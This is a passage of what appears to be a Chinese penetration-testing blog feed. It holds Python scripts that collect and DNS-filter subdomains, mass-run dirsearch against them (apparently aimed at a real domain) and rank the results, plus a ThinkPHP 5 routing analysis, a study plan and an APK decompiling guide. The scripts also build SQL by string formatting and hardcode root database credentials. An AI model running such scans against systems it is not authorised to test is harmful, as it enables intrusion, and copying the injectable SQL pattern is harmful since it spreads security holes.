(&apos;%s&apos;)&quot; % name)</span><br><span class="line">except:</span><br><span class="line">print(&quot;子域名重复：%s&quot; % name)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"># 输入：表，功能：将表项子域名输出到txt文本中</span><br><span class="line">def file(table):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(&quot;select * from %s&quot; % table)</span><br><span class="line">result = cursor.fetchall()</span><br><span class="line">string = &quot;&quot;</span><br><span class="line">for row in result:</span><br><span class="line">string += row[1] + &quot;\n&quot;</span><br><span class="line">with open(&quot;./%s.txt&quot; % table,&quot;a&quot;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">fp.write(string)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">file(&quot;ymm&quot;)</span><br></pre></td></tr></table></figure></p><h3 id="子域名dns验证"><a href="#子域名dns验证" class="headerlink" title="子域名dns验证"></a>子域名dns验证</h3><p>对抓获的子域名，有些可能是过期的，可以利用该脚本进行dns解析来判断子域名是否可以访问。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import pymysql</span><br><span class="line"></span><br><span class="line"># 输入：子域名表名 功能：将dns解析不到的子域名删除</span><br><span class="line">def filterDns(table = &quot;ymm&quot;):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">sql = &quot;select * from %s&quot; % table</span><br><span class="line">cursor.execute(sql)</span><br><span class="line">data = cursor.fetchall()</span><br><span class="line">for row in data:</span><br><span class="line">try:</span><br><span class="line">socket.gethostbyname(row[1].strip())</span><br><span class="line">except:</span><br><span class="line">print(&quot;no:&quot;+row[1])</span><br><span class="line">sql = &quot;delete from %s where name=&apos;%s&apos;&quot; % (table,row[1])</span><br><span class="line">print(sql)</span><br><span class="line">cursor.execute(sql)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line">filterDns(&apos;ymm&apos;)</span><br></pre></td></tr></table></figure></p><h2 id="目录扫描类"><a href="#目录扫描类" class="headerlink" title="目录扫描类"></a>目录扫描类</h2><h3 id="多线程dirsearch"><a href="#多线程dirsearch" class="headerlink" title="多线程dirsearch"></a>多线程dirsearch</h3><p>该脚本可以对搜寻到的子域名，多线程进行扫描，速度效果都不错，要求平台linux<br>输入子域名文件，输出指定位置json文件，和扫描信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import time, threading</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def myfunction(domain):</span><br><span class="line">print(&quot;thread %s is running&quot; % threading.current_thread().name)</span><br><span class="line">url = &quot;http://&quot; + domain</span><br><span class="line">try:</span><br><span class="line">requests.get(url,timeout=3)</span><br><span class="line">except:</span><br><span class="line">url = &quot;https://&quot; + domain</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">requests.get(url,timeout=3)</span><br><span class="line">except:</span><br><span class="line">print(&quot;%s fail&quot;%domain)</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">payload = &quot;python3 /root/tool/dirsearch/dirsearch.py -u %s -e all --json-report=./output/%s.json&gt;./txt/%s.txt&quot; % (url,domain,domain)</span><br><span class="line">os.system(payload)</span><br><span class="line">print(&quot;thread %s is ended&quot; % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run(l):</span><br><span class="line">lwork = []</span><br><span class="line">for i in range(0,10):</span><br><span class="line">domain = l[i].strip()</span><br><span class="line">t = threading.Thread(target=myfunction,name=domain,args=(domain,)) </span><br><span class="line">t.start()</span><br><span class="line">lwork.append(t)</span><br><span class="line"></span><br><span class="line">for i in lwork:</span><br><span class="line">i.join()</span><br><span class="line">print(&quot;ok&quot;)</span><br><span class="line"></span><br><span class="line">with open(&quot;./ymm.txt&quot;) as fp:</span><br><span class="line">l = fp.readlines()</span><br><span class="line"></span><br><span class="line">for i in range(13,len(l)/10):</span><br><span class="line">print(&quot;[*]%d turn is start&quot; % i)</span><br><span class="line">run(l[i*10:i*10+10])</span><br><span class="line">print(&quot;[*]%d turn finished&quot; % i)</span><br></pre></td></tr></table></figure></p><h3 id="对dirsearch扫描结果进行打分排序"><a href="#对dirsearch扫描结果进行打分排序" class="headerlink" title="对dirsearch扫描结果进行打分排序"></a>对dirsearch扫描结果进行打分排序</h3><p>对上述扫描得到的json文件进行打分排序，方便我们更有效率的搜寻漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">domain = &quot;about.56qq.cn&quot;</span><br><span class="line"></span><br><span class="line">#input:domain function:filter and star</span><br><span class="line">def check(domain):</span><br><span class="line">url = &quot;http://%s:80/&quot; % domain</span><br><span class="line"></span><br><span class="line">with open(&quot;./output/%s.json&quot; % domain,&quot;rb&quot;) as fp:</span><br><span class="line">filejson = json.load(fp)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">l = filejson[url]</span><br><span class="line">except:</span><br><span class="line">url = &quot;https://%s:443/&quot; % domain</span><br><span class="line">try:</span><br><span class="line">l = filejson[url]</span><br><span class="line">except:</span><br><span class="line">print(&quot;%s fail&quot; % domain)</span><br><span class="line"></span><br><span class="line">lengths = []</span><br><span class="line">lengths.append(l[0][&apos;content-length&apos;])</span><br><span class="line"></span><br><span class="line">star = 0</span><br><span class="line">result = []</span><br><span class="line">flag = [0,0,0,0]</span><br><span class="line">for row in l:</span><br><span class="line">length = row[&apos;content-length&apos;]</span><br><span class="line">status = row[&apos;status&apos;]/100</span><br><span class="line">if length in lengths:</span><br><span class="line">continue</span><br><span class="line"></span><br><span class="line">lengths.append(length)</span><br><span class="line">if status == 2:</span><br><span class="line">star += 4</span><br><span class="line">elif status == 3 and flag[1]&lt;3:</span><br><span class="line">star += 2</span><br><span class="line">flag[1] +=1</span><br><span class="line">elif status == 5 and flag[2]&lt;3:</span><br><span class="line">star += 2</span><br><span class="line">flag[2] += 1</span><br><span class="line">elif status == 4 and flag[2]&lt;3:</span><br><span class="line">star +=1</span><br><span class="line">flag[3] += 1</span><br><span class="line">result.append(row)</span><br><span class="line"></span><br><span class="line">return (domain,star,result)</span><br><span class="line"></span><br><span class="line">def takeSecond(elem):</span><br><span class="line">    return elem[1]</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">files = os.listdir(&quot;./output&quot;)</span><br><span class="line">result = []</span><br><span class="line">for i in files:</span><br><span class="line">result.append(check(i[:-5]))</span><br><span class="line"></span><br><span class="line">result.sort(key=takeSecond)</span><br><span class="line">result.reverse()</span><br><span class="line">for i in result:</span><br><span class="line">print(i[:-1])</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;子域名类&quot;&gt;&lt;a href=&quot;#子域名类&quot; class=&quot;headerlink&quot; title=&quot;子域名类&quot;&gt;&lt;/a&gt;子域名类&lt;/h2&gt;&lt;h3 id=&quot;子域名匹配及后续处理&quot;&gt;&lt;a href=&quot;#子域名匹配及后续处理&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>2019下半年计划</title>
    <link href="http://yoursite.com/2019/10/16/2019%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%AE%A1%E5%88%92/"/>
    <id>http://yoursite.com/2019/10/16/2019下半年计划/</id>
    <published>2019-10-15T18:03:08.000Z</published>
    <updated>2019-10-15T18:03:08.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安全范围很大，自己也有点贪心，最近一段时间自己学的也比较范。写个规划相当于指明个方向，让自己更加有计划性的学习。</p><h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><ol><li>坚持更新博客</li><li>开始学习java web编程</li><li>每天实战渗透练练手<br> 从实战中遇到问题来进行学习<br> 多魔改工具，实现自动化测试</li><li>背单词 ，高数上复习</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;安全范围很大，自己也有点贪心，最近一段时间自己学的也比较范。写个规划相当于指明个方向，让自己更加有计划性的学习。&lt;/p&gt;
&lt;h2 id=&quot;规
      
    
    </summary>
    
      <category term="规划" scheme="http://yoursite.com/categories/%E8%A7%84%E5%88%92/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp5.x 框架分析</title>
    <link href="http://yoursite.com/2019/10/07/thinkphp5.x%20%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/10/07/thinkphp5.x 框架分析/</id>
    <published>2019-10-07T15:43:30.000Z</published>
    <updated>2019-10-07T15:43:30.241Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近在n1ctf遇到thinkphp的利用链挖掘，以及上学期很火的rce漏洞，都需要对tp5框架流程有一个清晰的认识。可能记得有些杂，主要是作为个人笔记使用。</p><h2 id="二、小知识点"><a href="#二、小知识点" class="headerlink" title="二、小知识点"></a>二、小知识点</h2><h3 id="2-1-自动加载"><a href="#2-1-自动加载" class="headerlink" title="2.1.自动加载"></a>2.1.自动加载</h3><p>主要是利用<code>spl_autoload_register</code>函数，该函数是用来注册自动加载函数。什么是自动加载函数呢，就是当我们调用一个不存在的类，如<code>new person()</code>时，就会自动调用这个自动加载函数，并且把类名<code>person</code>传入该函数中，我们就可以通过自动加载函数来包含指定文件来获得该类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">spl_autoload_register(&quot;autoload&quot;);</span><br><span class="line">function autoload($class) &#123;</span><br><span class="line">echo $class;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new person;</span><br><span class="line">//输出person</span><br></pre></td></tr></table></figure></p><h3 id="2-2-符号"><a href="#2-2-符号" class="headerlink" title="2.2.符号?:"></a>2.2.符号<code>?:</code></h3><p>当参数==false时，就会为后一个值，否则就为本身。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(&apos;&apos; ?: 1); //输出1</span><br><span class="line">var_dump(&apos;0&apos; ?: 1); //输出1</span><br><span class="line">var_dump(&apos;hello&apos; ?: 1); //输出hello</span><br></pre></td></tr></table></figure></p><h3 id="2-3-return-include-file"><a href="#2-3-return-include-file" class="headerlink" title="2.3.return include file"></a>2.3.<code>return include file</code></h3><p>存在该文件成功会返回<code>True</code>，否则会报错。</p><h3 id="2-4-SERVER-39-PATH-INFO-39"><a href="#2-4-SERVER-39-PATH-INFO-39" class="headerlink" title="2.4. $_SERVER[&#39;PATH_INFO&#39;]"></a>2.4. <code>$_SERVER[&#39;PATH_INFO&#39;]</code></h3><p>该全局变量会返回文件名后类似<code>/abc/def</code>这样的字符串，但是不包含<code>?a=1</code>类型的query字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_SERVER[&apos;PATH_INFO&apos;]);</span><br></pre></td></tr></table></figure></p><p>访问<code>http://localhost/test.php/hello/good/?a=asdf</code><br>返回<code>/hello/good</code></p><h3 id="2-5-闭包函数"><a href="#2-5-闭包函数" class="headerlink" title="2.5.闭包函数"></a>2.5.闭包函数</h3><p>闭包函数其实也叫匿名函数，该函数可以进行赋值，当做参数传入到函数中。<br>闭包函数要访问外界的变量需要使用<code>use</code>关键字，该关键字类似于传参。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function getMoney() &#123;</span><br><span class="line">    $rmb = 1;</span><br><span class="line">    $dollar = 6;</span><br><span class="line">    $func = function() use ( $rmb ) &#123;</span><br><span class="line">        echo $rmb;</span><br><span class="line">        echo $dollar;</span><br><span class="line">    &#125;;</span><br><span class="line">    $func();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getMoney();</span><br><span class="line">//输出1</span><br><span class="line">//找不到dollar报错。</span><br></pre></td></tr></table></figure></p><h3 id="2-6-reflectionClass"><a href="#2-6-reflectionClass" class="headerlink" title="2.6.reflectionClass"></a>2.6.reflectionClass</h3><p>反射类，可以利用反射类对类进行诸如获取常量，方法，路径等操作，是间接的控制类。</p><h3 id="2-7-new-static"><a href="#2-7-new-static" class="headerlink" title="2.7.new static()"></a>2.7.new static()</h3><p>返回本对象的实例，与new self()的区别在于，new self()无论谁来调用都是返回自身的实例，而new static()返回的是new调用者自己的实例。</p><h2 id="三、框架流程"><a href="#三、框架流程" class="headerlink" title="三、框架流程"></a>三、框架流程</h2><p>先说一下分析流程：入口文件-&gt;基础文件-&gt;自动加载-&gt;run方法-&gt;路由分析</p><p>（1）入口文件public/index.php<br>就三行代码，先加载基础文件，再调用app类的run方法开启流程，先看基础文件。<br><img src="/img/1570200671007.png" alt=""><br>（2）基础文件thinkphp/base.php，载入Loader、注册自动加载、注册错误异常机制、实现日志、注册类库别名。<br>主要看注册自动加载<br><img src="/img/1570200950746.png" alt=""><br>（3）自动加载流程think\loader<br>将loader::autoload注册为自动加载函数<br><img src="/img/1570201455618.png" alt=""><br>第125行，利用findFile找到对应类的对应文件名，然后在132行进行包含该文件。<br><img src="/img/1570201519707.png" alt=""><br>（1）回到入口文件，第21行代码开始执行框架流程，调用think\app类的run方法，该方法对应整个框架的流程。<br>该方法我们主要分析路由流程，即我们如何访问到index模块的Test控制器的hello方法。<br><img src="/img/1570202657783.png" alt=""></p><h2 id="四、路由分析"><a href="#四、路由分析" class="headerlink" title="四、路由分析"></a>四、路由分析</h2><p>分析流程：路由检测-&gt;路由解析-&gt;路由调度<br>我们主要通过代码分析，框架是如何通过路由调度到Index模块Test控制器的hello方法<br><img src="/img/1570203307639.png" alt=""></p><h3 id="4-1-路由检测"><a href="#4-1-路由检测" class="headerlink" title="4.1.路由检测"></a>4.1.路由检测</h3><p>路由检测主要功能是获取用户提交的路由信息，默认是pathinfo。<br>（1）从run函数进入think\app\routecheck()函数<br>检测路由缓存默认不开启，我们就先跳过，进入request的path函数。<br><img src="/img/1570276191626.png" alt=""><br>（2）因为App类并没有request属性，所以会调用父类Containner的魔术方法<strong>get()<br><img src="/img/1570276388297.png" alt=""><br>（3）</strong>get()方法调用Containner.make()方法<br>第268行，从本地属性name获取到request的命名空间赋值给abstract。<br>在271行，返回request对象。<br><img src="/img/1570452223816.png" alt=""><br>（4）因此调到request.path()方法中<br>request.path()方法在720行调用本类的pathinfo()方法<br><img src="/img/1570452552631.png" alt=""><br>（5）request.pathinfo()方法<br>因为我们使用的默认路由，所以在第三个判断通过SERVER函数来获取路由信息<code>/index/Test/hello</code>。<br>第705行将最左边的反斜线去掉，然后返回pathinfo信息<code>index/Test/hello</code>。<br><img src="/img/1570452676638.png" alt=""><br>（6）返回到request.path()方法<br>之后只是去除后缀信息，就进行返回<br>（7）最后返回到routecheck()函数，路由获取与检测完毕。</p><h3 id="4-2-路由解析"><a href="#4-2-路由解析" class="headerlink" title="4.2.路由解析"></a>4.2.路由解析</h3><p>路由解析主要是对路由进行判断过滤，检查合法性，最后将其赋值到module、controller、action中。<br>（1）路由解析从app.routecheck函数开始。<br>routecheck函数，在第604行调用route.check方法。<br><img src="/img/1570453293024.png" alt=""><br>（2）route.check方法<br>前面方法与路由有关，默认都是false，可以跳过，关键在最后901行<br>主要就是new了一个UrlDispatch对象。<br><img src="/img/1570453375278.png" alt=""><br>这个对象实际上是<code>think\route\dispatch\Url</code>对象，我们简称URL对象<br><img src="/img/1570453561552.png" alt=""><br>（3）new一个不存在的类，根据命名空间触发自动加载<br><img src="/img/1570453643568.png" alt=""><br>（4）因为URL对象没有构造方法，所以触发父类Dispatch对象的构造方法<br>主要将第三个参数dispatch，即我们的路由赋值到<code>$this-&gt;dispatch</code>以便之后调用。<br><img src="/img/1570453749089.png" alt=""><br>（5）构造完成，返回到routecheck方法。<br>routecheck方法再将这个URL对象返回，而在他的上层方法run方法，调用了其返回的URL对象的init的方法。<br>（6）url.init()方法<br>init方法首先在第23行，对该路由通过parseurl方法进行解析。<br><img src="/img/1570454059351.png" alt=""><br>（7）url.parseurl()方法<br>在第48行通过rule.parseUrlPath对路由解析。<br><img src="/img/1570454179801.png" alt=""><br>（8）rule.parseUrlPath()方法<br>进入第二个判断，利用<code>explode</code>函数以<code>/</code>分割，将3个值组成数组并返回。<br><img src="/img/1570454270043.png" alt=""><br>（9）url.parseurl()方法<br>利用array_shift函数，这个函数功能是将数组第一个值取出，然后分别赋值给模块、控制器、操作、参数。<br><img src="/img/1570454442522.png" alt=""><br>然后在第88行，将路由封装返回。<br><img src="/img/1570454597843.png" alt=""><br>（10）返回到init方法<br>之后进行实例化Module对象，并调用其init方法。<br><img src="/img/1570454701855.png" alt=""><br>（11）Module对象的父类依然是Dispatch，通过其进行构造<br>依然是将第三个参数赋给<br><img src="/img/1570454775818.png" alt=""><br>（12）Module.init()<br>在第31行获取路由信息。<br>在第39行对模块信息进行html和转换为小写处理。<br>进入第二个判断，需要模块不在黑名单类，并且该模块存在。<br><img src="/img/1570455158655.png" alt=""><br>第58行将模块进行初始化<br><img src="/img/1570455332680.png" alt=""><br>之后设置控制器名和操作名<br><img src="/img/1570455472698.png" alt=""><br>然后返回Module对象回来到run方法，赋值给<code>$dispatch</code>变量，之后通过该变量进行路由调度，至此，路由解析结束。</p><h3 id="4-3-路由调度"><a href="#4-3-路由调度" class="headerlink" title="4.3.路由调度"></a>4.3.路由调度</h3><p>路由调度<br>（1）app.run()<br>调用middleware中间件类的add方法，将闭包函数传入，顾名思义其实就是添加一个中间件，我们具体分析下。<br><img src="/img/1570456531472.png" alt=""><br>（2）middleware.add()<br>调用buildmidlleware()设置中间件，在第70行将中间件添加到中间件队列中，等会要调用。<br><img src="/img/1570456596942.png" alt=""><br>（3）app.run()方法<br>进入dispatch方法，进行调用。<br><img src="/img/1570456845597.png" alt=""><br>（4）middleware.dispatch()<br>调用本地resolve方法，其返回值作为参数之一。<br><img src="/img/1570456880416.png" alt=""><br>（5）middleware.resovle()<br>第176行，弹出中间件，之后就调用app中的闭包函数。<br><img src="/img/1570456981303.png" alt=""><br>（6）app.run()的闭包函数<br>data是为空的，所以这个函数调用了dispatch对象的run方法。<br><img src="/img/1570457105406.png" alt=""><br>（7）Dispatch.run()<br>前面基本没什么用，主要在第168行调用了其父类Module的exec()方法。<br><img src="/img/1570457194013.png" alt=""><br>（8）Module.exec()<br>第91行调用app类的controller方法来实例化控制器。<br><img src="/img/1570457342030.png" alt=""><br>（9）App.controller()<br>调用parseModuleAndClass来解析模块和类<br><img src="/img/1570457476767.png" alt=""><br>（10）App.parseModuleAndClass()<br>如果name值由斜线调用第一个判断，name值其实就是我们刚才解析设置的controller，将类设置为我们的控制器类。<br>否则进入parseclass来获得控制器。<br><img src="/img/1570457567485.png" alt=""><br>（11）App.parseClass()<br>具体看的有点晕，就是利用系统的一些值配置来获得控制器的具体类位置，最后返回module和controller。<br><img src="/img/1570457858906.png" alt=""><br>（12）返回到controller()函数<br>其利用App.<strong>get()方法来获得我们指定的那个类。<br>（13）app.</strong>get()<br><img src="/img/1570458023998.png" alt=""><br>（14）Container.make()<br>make方法不再像刚才进入270判断内，二十进入274的判断里面，并不在绑定函数中，进入else。<br>else中进入App.invokeClass()函数中。<br><img src="/img/1570458066480.png" alt=""><br>（15）Container.invokeClass()函数<br>该函数在第424行，创建控制的反射类，判断反射类中有没有<code>__make</code>魔术方法，在435行获取其控制方法，显然我们没设置，跳过。<br>最后在439行创建类的一个新实例，并将参数传入，返回其实例。<br><img src="/img/1570458209613.png" alt=""><br>（16）Container.make()函数<br>最后将该实例放入，instances属性中，方便之后调用，返回该对象，回到exec()函数<br>（17）Module.exec()函数<br>之后调用middleware的controller方法，其实依然是调用add方法，并传入一个闭包函数，相当于在传入一个中间件。<br><img src="/img/1570459563063.png" alt=""><br>（18）middleware.controller<br>看，相当于调用，add方法，但是第二个参数为<code>controller</code>。<br><img src="/img/1570459814950.png" alt=""><br>（19）Module.exec()函数<br>之后在第140行调用行dispatch，相当于执行这个中间件。<br>（20）执行这个闭包函数<br>第105行获取操作名，第112行利用反射类获取操作方法，并获取其操作名，在request类中设置操作属性为操作名。<br>第119行获取变量。在第135行将实例，反射类方法，参数传入到App.invokeReflectMethod方法中<br><img src="/img/1570460039044.png" alt=""><br>（21）App.invokeReflectMethod()方法<br>第395行代码调用反射类方法的InvokeArgs方法，会去调用我们的实例化类的指定方法。<br><img src="/img/1570460707610.png" alt=""><br>（22）Test.hello()<br>成功调用我们的控制类方法，至此路由调度结束。<br><img src="/img/1570461677792.png" alt=""></p><h3 id="五、输出返回"><a href="#五、输出返回" class="headerlink" title="五、输出返回"></a>五、输出返回</h3><p>（1）返回到我们的闭包函数<br>我们的hello()方法返回了字符串<code>hello world</code>，传递给$data变量，并将其传入父类Dispatch的autoResponse()方法自动输出。<br><img src="/img/1570461759167.png" alt=""><br>（2）Dispatch.autoResponse()<br>进入第二个判断，首先判断是否是Ajax，根据结果做不同处理。<br>第182行，进入Resonpse.create()方法<br><img src="/img/1570461893953.png" alt=""><br>（3）Resonpse.create()<br>第一行代码根据类型获取不同的类<br>最后设置http返回码，header头，数据。<br>最后通过new static()来创建自身的实例。<br><img src="/img/1570462154435.png" alt=""><br>（4）Response.__construct()<br>设置一些返回的http参数。<br><img src="/img/1570462595440.png" alt=""><br>（5）Dispatch.autoResponse()<br>返回response对象<br>（6）返回到中间件resolve函数<br>也是返回response对象<br><img src="/img/1570462682222.png" alt=""><br>（7）返回到Dispatch.run()方法<br>也是返回response对象<br><img src="/img/1570462729966.png" alt=""><br>（8）最终返回到App.run()方法<br>也是返回response对象<br><img src="/img/1570462769307.png" alt=""><br>（9）还记得入口文件在调用app.run()方法后还调用了send方法吗？<br>就是调用Response对象的send()方法，最后通过send方法设置http参数，发送数据到客户端，至此thinkphp5流程结束。<br><img src="/img/1570462867779.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/888/" target="_blank" rel="noopener">https://paper.seebug.org/888/</a><br><a href="https://www.kancloud.cn/manual/thinkphp5/118003" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118003</a><br><a href="https://www.jianshu.com/p/c88d5bb329b4" target="_blank" rel="noopener">https://www.jianshu.com/p/c88d5bb329b4</a><br><a href="https://www.cnblogs.com/wqy415/p/7890116.html" target="_blank" rel="noopener">https://www.cnblogs.com/wqy415/p/7890116.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;最近在n1ctf遇到thinkphp的利用链挖掘，以及上学期很火的rce漏洞，都需要对tp5框架流程有一个清晰的认识。可能记
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>apk反编译</title>
    <link href="http://yoursite.com/2019/09/20/apk%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <id>http://yoursite.com/2019/09/20/apk反编译/</id>
    <published>2019-09-20T08:20:38.000Z</published>
    <updated>2019-09-20T08:20:38.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做题的时候遇到web类安卓题目，需要反编译，记录一下。</p><h2 id="apktool"><a href="#apktool" class="headerlink" title="apktool"></a>apktool</h2><p>下载地址：<a href="https://github.com/iBotPeaches/Apktool/blob/gh-pages/install/index.md" target="_blank" rel="noopener">https://github.com/iBotPeaches/Apktool/blob/gh-pages/install/index.md</a><br>将apk文件放在当前目录，然后通过以下命令处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk</span><br></pre></td></tr></table></figure></p><p>会解压出文件，对应的xml文件不会是乱码。</p><h2 id="dex2jar"><a href="#dex2jar" class="headerlink" title="dex2jar"></a>dex2jar</h2><p>下载地址：<a href="http://www.onlinedown.net/soft/989451.htm" target="_blank" rel="noopener">http://www.onlinedown.net/soft/989451.htm</a><br>将apk文件后缀名改为zip或rar，进行解压，在解压文件中中能找到classes.dex文件。<br>将他复制到工具目录中，通过以下命令进行处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\d2j-dex2jar.bat classes.dex</span><br></pre></td></tr></table></figure></p><p>将会在当前目录生成对应的classes-dex2jar.jar</p><h2 id="jd-gui"><a href="#jd-gui" class="headerlink" title="jd-gui"></a>jd-gui</h2><p>下载地址：<a href="http://java-decompiler.github.io/" target="_blank" rel="noopener">http://java-decompiler.github.io/</a><br>打开工具，通过工具打开上一步生成的jar文件即可。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/96875c707f8a" target="_blank" rel="noopener">https://www.jianshu.com/p/96875c707f8a</a></p>]]></content>
    
    <summary type="html">
    
      
      
